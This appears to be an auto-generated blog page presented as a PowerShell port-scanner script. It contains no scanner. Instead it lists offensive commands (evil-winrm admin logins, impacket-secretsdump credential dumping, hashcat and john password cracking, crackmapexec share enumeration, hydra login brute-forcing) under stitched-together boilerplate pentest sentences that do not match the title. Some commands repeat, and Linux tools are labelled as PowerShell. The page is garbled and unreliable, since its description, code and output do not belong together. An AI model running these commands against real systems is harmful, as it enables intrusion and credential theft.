---
TitleSEO: "Automated Port Scanner in PowerShell | ZureFX"
TitlePost: "Automated Port Scanner — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for automated port scanner. Built for security research and automation."
Keywords: "go, bash, python, c, tool, powershell"
URL: "https://zurefx.github.io/scripting/script-automated-port-scanner-128.html"
URL_IMAGES: ""
Date: "2024-11-27"
Tags: "Go, Bash, Python, C, Tool, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-automated-port-scanner-128"
Permalink: "/scripting/script-automated-port-scanner-128.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Network traffic analysis revealed unencrypted communications containing user credentials. The database credentials were hardcoded in the application source code. Post-exploitation enumeration revealed a path to domain administrator privileges.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `sqlmap`
- `feroxbuster`
- `crackmapexec`

## Implementation

### Core Logic

Initial enumeration revealed several interesting open ports on the target. Unconstrained delegation was enabled on the compromised machine.

```powershell
evil-winrm -i 10.44.250.110 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.95.23.130
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The database credentials were hardcoded in the application source code. The kernel version was outdated and vulnerable to a publicly known exploit.

### Helper Functions

Post-exploitation enumeration revealed a path to domain administrator privileges. Initial enumeration revealed several interesting open ports on the target.

```powershell
evil-winrm -i 10.58.200.219 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.70.139.69 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.66.226.222 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Usage

### Basic Usage

Authentication bypass was achieved through careful manipulation of the login mechanism. The application stored sensitive credentials in an unencrypted configuration file.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.32.217.247/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.56.215.162 -u administrator -p 'P@ssw0rd!' --shares
```

### Advanced Options

Weak file permissions allowed modification of critical system files. Unconstrained delegation was enabled on the compromised machine. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
feroxbuster -h
evil-winrm -i 10.89.75.172 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.19.43.97 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.85.146.42
```

## Output

### Example Output

Privilege escalation was possible due to misconfigured sudo permissions. Token impersonation allowed elevation to SYSTEM privileges on the target.

```
[+] Scanning target...
[+] Found 17 results
[+] Done in 2.83s
```
